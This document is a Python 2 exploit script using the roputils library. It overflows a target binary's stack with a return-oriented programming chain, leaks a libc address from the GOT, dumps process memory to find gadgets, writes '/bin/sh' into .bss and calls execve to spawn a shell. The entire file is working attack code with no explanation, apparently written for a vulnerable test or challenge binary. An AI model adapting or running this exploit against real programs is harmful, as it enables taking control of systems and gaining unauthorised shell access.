from roputils import *

fpath = sys.argv[1]
offset = int(sys.argv[2])

rop = ROP(fpath)
addr_stage = rop.section('.bss') + 0x400
nr_execve = 59

buf = rop.retfill(offset)
buf += rop.call_chain_ptr(
    ['write', 1, rop.got('__libc_start_main'), 8]
)
buf += rop.p(rop.addr('main'))

p = Proc(rop.fpath)
p.write(p32(len(buf)) + buf)
print "[+] read: %r" % p.read(len(buf))
ref_addr = p.read_p64()
print "[+] ref_addr = %x" % ref_addr

buf = rop.retfill(offset)
buf += rop.call_chain_ptr(
    ['write', 1, ref_addr, 0x200000],
    ['read', 0, addr_stage, 100],
)
buf += rop.p(rop.addr('main'))

p.write(p32(len(buf)) + buf)
print "[+] read: %r" % p.read(len(buf))
data = p.read(0x200000)
print "[+] len(data) = %x" % len(data)
rop.load(data, base=ref_addr)

buf = p64(addr_stage+16)
buf += p64(0)
buf += rop.string('/bin/sh')
buf += rop.fill(100, buf)
p.write(buf)

buf = rop.retfill(offset)
buf += rop.syscall(nr_execve, addr_stage+16, addr_stage, 0)

p.write(p32(len(buf)) + buf)
print "[+] read: %r" % p.read(len(buf))
p.wait(0)
